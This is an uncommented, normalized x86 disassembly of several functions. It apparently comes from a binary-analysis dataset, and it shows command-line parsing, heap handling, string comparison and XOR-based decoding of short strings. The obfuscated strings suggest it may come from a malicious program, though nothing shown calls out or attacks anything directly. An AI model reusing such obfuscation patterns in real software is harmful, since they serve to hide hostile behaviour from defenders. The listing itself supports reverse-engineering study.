call sub_100081b8
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_1001a163
push 0x30
mov eax sub_1008029c
call sub_1001bb6b
mov eax [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp + 0x20 ]
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x34 ] ecx
jb r-xdata
xor ebx ebx
cmp [ eax ] 0x2d
mov [ ebp - 0x30 ] bl
jne r-xdata
mov eax [ eax ]
mov cl [ eax ]
xor esi esi
jmp r-xdata
mov [ ebp - 0x30 ] 0x1
inc eax
cmp cl 0x30
jge r-xdata
cmp cl 0x39
jg r-xdata
push esi
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10043190
mov [ ebp - 0x4 ] ebx
cmp esi ebx
jne r-xdata
inc esi
mov cl [ esi + eax ]
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x3c ] esp
push eax
call sub_1003f7a0
push [ ebp - 0x30 ]
mov ecx [ ebp - 0x34 ]
push [ ebp + 0x1c ]
push [ ebp - 0x38 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_10013e09
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
mov eax edi
call sub_1004fa89
retn 0x1c
push 0x30
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003f510
sub_1001a220
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
cmp [ eax + 0x104 ] edx
jbe r-xdata
pop ebp
retn 0x8
push ebx
push esi
pop esi
pop ebx
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp eax r--data
jne r-xdata
inc eax
cmp eax r--data
jne r-xdata
mov cl [ eax + edx ]
mov eax r--data
movsx esi cl
mov edi edi
sub eax [ ebp + 0xc ]
sub eax r--data
and eax 0x3f
mov al [ eax + r--data ]
mov al cl
jmp r-xdata
movzx ebx [ eax ]
cmp ebx esi
je r-xdata
mov al cl
jmp r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp edx [ edi + 0x10 ]
jae r-xdata
mov [ ecx + edx ] al
mov ecx [ ebp + 0x8 ]
inc edx
cmp edx [ ecx + 0x104 ]
jb r-xdata
sub_1001a2a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10082c28
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
xor edi edi
mov ebx ecx
mov [ ebp - 0x5c ] ebx
cmp eax edi
je r-xdata
xor eax eax
lea ecx [ ebp - 0x54 ]
push ecx
push eax
mov [ ebp - 0x54 ] edi
call [ CommandLineToArgvW@IAT ]
mov esi [ ebp - 0x54 ]
mov [ ebp - 0x4c ] eax
cmp esi edi
jne r-xdata
mov eax ebx
lea edx [ eax + 0x2 ]
cmp eax edi
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
inc eax
mov [ ebp - 0x58 ] eax
test esi esi
jg r-xdata
push eax
push edi
jmp r-xdata
xor edx edx
mov eax ebx
mov [ ebp - 0x2c ] dx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov eax [ ebp - 0x4c ]
test eax eax
je r-xdata
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100531b0
lea eax [ ebp - 0x2c ]
push eax
mov edx r--data
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_10030dc0
mov esi 0x8
add esp 0x4
cmp [ eax + 0x14 ] esi
jb r-xdata
push eax
push 0x0
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x4c ]
push ecx
push eax
mov eax [ edx + edi * 4 ]
push eax
call sub_1005ac4e
add esp 0xc
test eax eax
sete bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] dx
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1006591f
add esp 0x4
test bl bl
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1006591f
add esp 0x4
inc edi
cmp edi [ ebp - 0x54 ]
jl r-xdata
mov ecx [ ebp - 0x4c ]
mov edx [ ecx + edi * 4 ]
mov ebx [ ebp - 0x58 ]
lea eax [ edx + ebx * 2 ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov ebx [ ebp - 0x5c ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
jne r-xdata
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x50 ] edi
mov ecx [ ebp - 0x50 ]
mov eax [ eax + ecx * 4 ]
lea edi [ ebx + ebx ]
add eax edi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ebx [ GetProcessHeap@IAT ]
sub eax edx
sar eax 0x1
lea edx [ eax + eax + 0x2 ]
push edx
push esi
call ebx
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x50 ]
mov esi eax
mov eax [ ebp - 0x4c ]
mov ecx [ eax + ecx * 4 ]
add ecx edi
mov eax ecx
lea edi [ eax + 0x2 ]
lea ebx [ ebx ]
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax edi
sar eax 0x1
add eax eax
push eax
push ecx
push esi
call sub_100796a0
mov ecx [ ebp - 0x4c ]
add esp 0xc
push ecx
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
sub_1001a4d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10082e01
mov eax [ fs : 0x0 ]
push eax
sub esp 0xe0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xec ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xe8 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0xe4 ] eax
movsx eax [ ecx ]
xor eax 0x63
xor ecx ecx
and eax 0xff
mov [ ebp - 0xdc ] ax
mov [ ebp - 0xda ] cx
mov ecx [ r--data ]
xor ebx ebx
xor eax eax
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0x75
and esi 0xff
mov [ ebp + eax * 2 - 0x18 ] si
inc eax
cmp eax 0x2
jb r-xdata
xor eax eax
mov [ ebp - 0x14 ] ax
xor ecx ecx
mov eax edx
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] cx
lea esi [ eax + 0x2 ]
mov edi edi
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x9c ]
call sub_100531b0
lea edx [ ebp - 0x9c ]
push edx
lea edx [ ebp - 0xdc ]
lea esi [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] ebx
call sub_10016380
add esp 0x4
push eax
lea edx [ ebp - 0x18 ]
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x1
call sub_10030dc0
add esp 0x4
mov esi 0x8
cmp [ ebp - 0xc0 ] esi
jb r-xdata
xor ecx ecx
mov [ ebp - 0xc0 ] 0x7
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] cx
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov eax [ ebp - 0xd4 ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] ax
nop
mov edx [ ebp - 0x9c ]
push edx
call sub_1006591f
add esp 0x4
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffba
and edx 0xff
mov [ ebp + eax * 2 - 0x80 ] dx
inc eax
cmp eax 0x2c
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x28 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffbe
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
push ecx
lea edx [ ebp - 0xec ]
xor eax eax
push edx
lea edx [ ebp - 0x80 ]
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x1c ] ax
call sub_10059890
mov eax [ r--data ]
movsx ecx [ eax ]
mov eax [ r--data ]
xor ecx 0xff9c
and ecx 0xff
mov [ ebp - 0xd8 ] cx
xor edx edx
mov [ ebp - 0xd6 ] dx
movsx ecx [ eax ]
xor ecx 0x55
and ecx 0xff
mov [ ebp - 0xe0 ] cx
lea eax [ ebp - 0xe0 ]
push eax
lea ecx [ ebp - 0xe8 ]
mov [ ebp - 0xde ] dx
push ecx
lea edx [ ebp - 0xd8 ]
lea ecx [ ebp - 0xb8 ]
call sub_10059890
mov ecx [ ebp - 0xb8 ]
add esp 0x10
cmp [ ebp - 0xa4 ] esi
jae r-xdata
mov edx [ ebp - 0xe4 ]
call sub_10017560
cmp [ ebp - 0xa4 ] 0x8
mov esi eax
jb r-xdata
lea ecx [ ebp - 0xb8 ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xb8 ]
push edx
call sub_1006591f
add esp 0x4
sub_1001a780
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0xc ]
push edi
mov edi [ LocalFree@IAT ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call edi
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1001a7e0
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
sub eax edi
mov ecx eax
and ecx 0xfffffffc
cmp ecx 0x4
jle r-xdata
pop edi
mov esp ebp
pop ebp
retn
push esi
mov edx [ edi + eax - 0x4 ]
mov ecx [ edi ]
lea esi [ eax - 0x4 ]
mov [ edi + eax - 0x4 ] ecx
mov [ ebp - 0x4 ] edx
push ebx
lea edx [ ebp - 0x4 ]
mov eax esi
sar eax 0x2
push edx
push eax
xor eax eax
call sub_100135b0
mov eax esi
mov ecx esi
and ecx 0xfffffffc
add esp 0xc
cmp ecx 0x4
jg r-xdata
pop esi
sub_1001a830
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push edi
mov edi [ eax ]
test edi edi
jne r-xdata
push ebx
mov ebx [ lstrcmpW@IAT ]
mov [ ebp - 0x4 ] 0x0
push esi
lea eax [ edi + 0x1 ]
pop edi
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov edi [ edi + 0x4 ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
mov [ eax + 0x4 ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ edi ]
mov ecx [ ecx + 0x4 ]
mov edx [ eax + 0x4 ]
mov esi [ edi + 0x4 ]
push ecx
push edx
call ebx
test eax eax
je r-xdata
pop esi
pop ebx
lea eax [ edi + 0x2 ]
pop edi
mov esp ebp
pop ebp
retn 0x8
push edi
call [ LocalFree@IAT ]
pop esi
pop ebx
xor eax eax
pop edi
mov esp ebp
pop ebp
retn 0x8
call sub_10021ec0
mov esi [ edi ]
test esi esi
je r-xdata
sub_1001a8c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008185d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cmp [ ebx + 0xec ] 0x0
mov [ ebp - 0x128 ] eax
mov [ ebp - 0x12c ] ecx
jne r-xdata
push 0x4
lea esi [ ebp - 0x120 ]
mov edi ebx
call sub_10023b00
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x2
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x84 ] al
call sub_10043190
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov eax 0x42
jmp r-xdata
push esi
lea eax [ ebp - 0x120 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0x84 ]
call sub_1001a220
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
push esi
push ebx
lea eax [ ebp - 0x120 ]
call sub_1000e9c0
mov edx [ ebp - 0x128 ]
push edx
mov [ ebp - 0x130 ] eax
lea eax [ ebp - 0xbc ]
push r--data
push eax
call sub_100430c0
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x120 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0xbc ]
call sub_1001a220
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1000e9c0
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0xd8 ]
push r--data
push edx
mov [ ebp - 0x128 ] eax
call sub_100430c0
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0xd8 ]
call sub_1001a220
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1000e9c0
push 0x24ac4
lea esi [ ebp - 0x110 ]
mov [ ebp - 0x12c ] eax
call sub_1006a2d0
push eax
lea edx [ ebp - 0xa0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x4
call sub_10021390
add esp 0x10
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0xfc ] 0x10
jb r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] 0x0
mov [ ebp - 0x110 ] 0x0
cmp ecx 0x3
ja r-xdata
mov eax [ ebp - 0x110 ]
push eax
call sub_1006591f
add esp 0x4
lea eax [ esi + 0x54 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0xa0 ]
call sub_1001a220
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_1000e9c0
mov ecx [ ebp - 0x130 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x124 ] eax
call sub_100074a0
mov esi eax
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x7
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x8
call sub_1006bcb0
mov ecx eax
mov [ ebp - 0x4 ] 0x9
mov esi [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_10050437
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_10035d20
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_10050437
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x128 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xbc ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xa
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xb
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0xc
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_10050437
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xd
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xe
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0xf
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x38 ]
push esi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_10050437
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x124 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x11
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x54 ]
push esi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_10050437
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1006591f
add esp 0x4
lea ecx [ ebp - 0xf4 ]
push ecx
lea edi [ ebp - 0x120 ]
call sub_10055ba0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x13
mov [ ebp - 0x124 ] esp
push 0xffffffff
xor esi esi
push esi
lea edx [ ebp - 0xf4 ]
mov edi 0xf
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_100417c0
push esi
push ebx
call sub_10022030
mov ebx 0x10
mov [ ebp - 0x124 ] eax
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xf4 ] 0x0
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov eax [ ebp - 0xf4 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] 0x0
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov ecx [ ebp - 0xa0 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xd8 ] 0x0
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov edx [ ebp - 0xd8 ]
push edx
call sub_1006591f
add esp 0x4
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] esi
mov [ ebp - 0xbc ] 0x0
cmp [ ebp - 0x70 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x120 ]
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] 0x0
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x124 ]
mov edx [ ebp - 0x124 ]
push edx
mov edx [ ebp - 0x11c ]
lea ecx [ ebp - 0x114 ]
push ecx
push edx
push eax
call sub_10011560
mov eax [ ebp - 0x120 ]
push eax
call sub_1006591f
add esp 0x14
sub_1001b110
push ebp
mov ebp esp
push 0xffffffff
push sub_10080ef8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_100014b7
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_10058bff
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10050f50
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_10051730
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_100014b7
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_1005457d
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_1000bd19
lea ecx [ ebp + 0x8 ]
call sub_10050f50
push esi
call sub_1004d80c
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_1001b250
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x1
jne r-xdata
call sub_10022260
test eax eax
jne r-xdata
call sub_100576f0
test eax eax
jne r-xdata
mov ecx eax
call sub_1003ace0
test eax eax
je r-xdata
mov eax 0x1
pop ecx
pop ebp
retn
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ rw-data ] 0x1
mov eax 0x2
pop ecx
pop ebp
retn
xor eax eax
pop ecx
pop ebp
retn
sub_1001b2a6
